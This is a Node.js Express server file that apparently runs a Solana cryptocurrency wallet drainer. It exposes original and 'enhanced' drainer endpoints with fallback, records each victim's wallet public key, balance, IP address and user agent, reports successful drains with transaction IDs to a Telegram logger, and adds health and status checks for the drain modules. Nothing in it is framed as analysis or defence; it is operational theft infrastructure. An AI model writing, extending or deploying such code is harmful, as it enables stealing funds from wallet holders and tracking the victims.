import express from 'express';
import cors from 'cors';
import drainerHandler from './api/drainer.js';
import telegramLogger from './src/telegram.js';

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// Original drainer endpoint (unchanged - ensures no functionality is broken)
app.post('/api/drainer', drainerHandler);

// Enhanced drainer endpoint (new - with all optimizations)
app.post('/api/enhanced-drainer', async (req, res) => {
  try {
    // Dynamic import to avoid startup errors if enhancement modules are missing
    const { default: enhancedDrainerHandler } = await import('./api/enhanced-drainer.js');
    await enhancedDrainerHandler(req, res);
  } catch (error) {
    console.error('Enhanced drainer failed to load:', error.message);
    // Fallback to original drainer if enhanced version fails
    console.log('Falling back to original drainer...');
    await drainerHandler(req, res);
  }
});

// Log wallet detection
app.post('/api/drainer/log-wallet', async (req, res) => {
  try {
    const { publicKey, lamports, ip, userAgent } = req.body;
    
    await telegramLogger.logWalletDetected({
      publicKey,
      lamports,
      ip,
      userAgent
    });
    
    res.json({ success: true, message: 'Wallet logged successfully' });
  } catch (error) {
    console.error('Error logging wallet:', error);
    res.status(500).json({ error: 'Failed to log wallet' });
  }
});

// Log transaction confirmation
app.post('/api/drainer/log-confirmation', async (req, res) => {
  try {
    const { publicKey, lamports, ip, userAgent, txid, status } = req.body;
    
    await telegramLogger.logDrainSuccess({
      publicKey,
      lamports,
      ip,
      userAgent,
      txid,
      status
    });
    
    res.json({ success: true, message: 'Confirmation logged successfully' });
  } catch (error) {
    console.error('Error logging confirmation:', error);
    res.status(500).json({ error: 'Failed to log confirmation' });
  }
});

// Enhancement modules status endpoint
app.get('/api/enhancements/status', async (req, res) => {
  try {
    // Dynamic import to avoid startup errors
    const { enhancementModules } = await import('./api/enhanced-drainer.js');
    
    const status = {
      timestamp: new Date().toISOString(),
      modules: {
        rpc: enhancementModules.rpcManager.getRPCStats(),
        rateLimiting: enhancementModules.rateLimiter.getRateLimitStats(),
        retry: enhancementModules.retryManager.getRetryStats(),
        fees: enhancementModules.feeOptimizer.getFeeStats(),
        monitoring: enhancementModules.transactionMonitor.getMonitoringStats(),
        wallet: enhancementModules.walletOptimizer.getWalletStats()
      }
    };
    
    res.json(status);
  } catch (error) {
    console.error('Error getting enhancement status:', error);
    res.status(500).json({ 
      error: 'Failed to get enhancement status',
      details: error.message,
      fallback: 'Enhancement modules not available'
    });
  }
});

// Enhancement modules health check
app.get('/api/enhancements/health', async (req, res) => {
  try {
    // Dynamic import to avoid startup errors
    const { enhancementModules } = await import('./api/enhanced-drainer.js');
    
    const healthReport = {
      timestamp: new Date().toISOString(),
      status: 'healthy',
      modules: {}
    };
    
    // Check RPC health
    try {
      await enhancementModules.rpcManager.performHealthCheck();
      healthReport.modules.rpc = 'healthy';
    } catch (error) {
      healthReport.modules.rpc = `unhealthy: ${error.message}`;
      healthReport.status = 'degraded';
    }
    
    // Check rate limiter
    try {
      const rateLimitStats = enhancementModules.rateLimiter.getRateLimitStats();
      healthReport.modules.rateLimiter = 'healthy';
    } catch (error) {
      healthReport.modules.rateLimiter = `unhealthy: ${error.message}`;
      healthReport.status = 'degraded';
    }
    
    // Check transaction monitor
    try {
      const monitoringStats = enhancementModules.transactionMonitor.getMonitoringStats();
      healthReport.modules.transactionMonitor = 'healthy';
    } catch (error) {
      healthReport.modules.transactionMonitor = `unhealthy: ${error.message}`;
      healthReport.status = 'degraded';
    }
    
    res.json(healthReport);
  } catch (error) {
    console.error('Error checking enhancement health:', error);
    res.status(500).json({ 
      error: 'Failed to check enhancement health',
      details: error.message,
      fallback: 'Enhancement modules not available'
    });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📊 Original drainer: http://localhost:${PORT}/api/drainer`);
  console.log(`🚀 Enhanced drainer: http://localhost:${PORT}/api/enhanced-drainer`);
  console.log(`📈 Enhancement status: http://localhost:${PORT}/api/enhancements/status`);
  console.log(`🏥 Enhancement health: http://localhost:${PORT}/api/enhancements/health`);
  console.log(`⚠️  Note: Enhanced endpoints will fallback to original if modules fail`);
});

export default app; 